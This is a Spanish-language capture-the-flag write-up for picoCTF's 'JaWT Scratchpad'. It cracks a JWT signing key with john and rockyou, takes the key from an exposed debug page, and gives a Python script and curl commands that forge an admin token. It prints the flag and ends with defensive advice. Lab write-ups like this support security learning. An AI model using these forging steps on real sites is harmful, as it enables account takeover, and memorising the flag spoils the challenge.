# JaWT Scratchpad

## Descripción

Check the admin scratchpad!
http://fickle-tempest.picoctf.net:62645

Referencias:
JSON: https://en.wikipedia.org/wiki/JSON
JWT : https://jwt.io/introduction
jwt debugger : https://jwt.lannysport.net/
john : https://github.com/openwall/john
Resolver:
Nos logueamos con cualquier usuario
Copiamos el token jwt a un archivo llamado token
Lo crackeamos en kali usando john con el diccionario rockyou.txt
gizip -d /usr/share/wordlists/rockyou.txt.gz
john token -w=/usr/share/wordlists/rockyou.txt

vamos al sitio jwt debuger, y modificamos el payload por admin
ponemos la palabra crackeada en la firma
copiamos el nuevo token generado a la cookie y recargamos la pagina

## Solución (documentada)

### Resumen

El servidor emite un JWT en la cookie tras registrarse con cualquier nombre. Al modificar el payload a `{"user":"admin"}` y firmar el token con la llave secreta usada por la aplicación, se puede acceder al scratchpad del administrador y leer la bandera.

### Método 1 — Según las instrucciones (brute-force con `john`)

1. Registrar/loguearse con cualquier usuario para recibir la cookie JWT. Por ejemplo:

```bash
curl -s -i -X POST -d "user=foo" http://fickle-tempest.picoctf.net:62645 | sed -n '1,120p'
```

Buscar en las cabeceras `Set-Cookie: jwt=...` y copiar el token en un fichero `token`.

2. En Kali (o donde tenga `john` y `rockyou`), usar `john` para crackear la clave HMAC del JWT:

```bash
# descomprimir rockyou si hace falta
#gzip -d /usr/share/wordlists/rockyou.txt.gz
# formatear el token para john (según su doc), luego:
john token -w=/usr/share/wordlists/rockyou.txt
```

3. Con la contraseña (clave) encontrada, usar el JWT debugger o un script para reemplazar el payload por `{"user":"admin"}`, firmarlo con la clave encontrada y poner el token resultante en la cookie `jwt`. Recargar la página mostrará el scratchpad de admin con la bandera.

### Método 2 — Recuperar la clave desde el debugger (rápido)

Durante la explotación intencional se observó que la aplicación corría en modo debug y la página de error del debugger exponía fragmentos de código donde se llamaba a `jwt.decode(cookie, 'ilovepico')`. Es decir, la clave usada para firmar los tokens es `ilovepico`.

Con esa clave podemos crear directamente un token con payload `{"user":"admin"}` y obtener la bandera. Ejemplo reproducible con Python:

```bash
python3 - << 'PY'
import base64,hashlib,hmac,json
header_b = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9'  # header original
payload = {'user':'admin'}
pb = base64.urlsafe_b64encode(json.dumps(payload,separators=(',',':')).encode()).decode().rstrip('=')
tosign = f"{header_b}.{pb}".encode()
secret = 'ilovepico'
sig = hmac.new(secret.encode(), tosign, hashlib.sha256).digest()
sb = base64.urlsafe_b64encode(sig).decode().rstrip('=')
token = f"{header_b}.{pb}.{sb}"
print(token)
PY

# Con el token impreso, establecer la cookie y pedir la página:
curl -s -i -b "jwt=<TOKEN_AQUI>" http://fickle-tempest.picoctf.net:62645 | sed -n '1,200p'
```

Ejemplo concreto (ya generado durante la verificación):

```bash
# token generado y usado durante la prueba
TOKEN=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDl4jVDvNbEe_JYEZTN19Vx6X9NNZtRVbKPBkhO-s

curl -s -i -b "jwt=$TOKEN" http://fickle-tempest.picoctf.net:62645 | sed -n '1,200p'
```

Salida (fragmento) que contiene la bandera:

```
<textarea ...>picoCTF{jawt_was_just_what_you_thought_bbb82bd4a57564aefb32d69dafb60583}</textarea>
```

### Nota de seguridad

- Evitar poner aplicaciones en modo debug en producción: el debugger puede exponer variables sensibles (como claves) y permitir ejecución remota.
- Para JWT: usar claves secretas robustas, rotación de claves y validar `alg` en el servidor (no confiar en `alg` enviado por cliente).

## Referencias

- JWT introduction: https://jwt.io/introduction
- JWT debug / tools: https://jwt.lannysport.net/
- John the Ripper: https://github.com/openwall/john